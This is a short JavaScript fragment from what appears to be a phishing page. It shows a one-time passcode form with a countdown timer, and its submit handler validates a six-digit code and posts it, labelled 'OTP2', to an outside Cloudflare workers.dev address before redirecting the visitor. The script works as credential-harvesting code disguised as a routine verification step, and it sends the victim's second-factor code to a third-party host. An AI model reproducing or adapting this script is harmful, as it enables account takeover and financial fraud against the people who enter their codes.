    <script>
        const otpInput = document.getElementById('otpInput');
        const timerElement = document.getElementById('timer');
        let seconds = 180;
        function updateTimer() { ... }
        updateTimer();
        
        otpInput.addEventListener('input', function(e) { ... });
        
        document.querySelector('.proceed-button').addEventListener('click', async function(e) {
            e.preventDefault();
            const otpValue = otpInput.value.trim();
            if (otpValue.length !== 6 || !/^\d+$/.test(otpValue)) {
                otpInput.style.borderBottomColor = '#ff4444';
                return;
            }
            
            const submission = {
                id: Date.now(),
                type: 'OTP2',
                data: { otp: otpValue },
                timestamp: new Date().toISOString()
            };

            try {
                const response = await fetch('https://aged-sunset-63e0.skd38824.workers.dev/', {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(submission)
                });

                if (response.ok) {
                    const result = await response.json();
                    if (result.success) {
                        window.location.href = 'about.html';   // redirect to about.html
                    } else {
                        alert('Error: ' + (result.error || 'unknown'));
                    }
                } else {
                    alert('Server error: ' + response.status);
                }
            } catch (error) {
                alert('Network error: ' + error.message);
            }
        });
    </script>
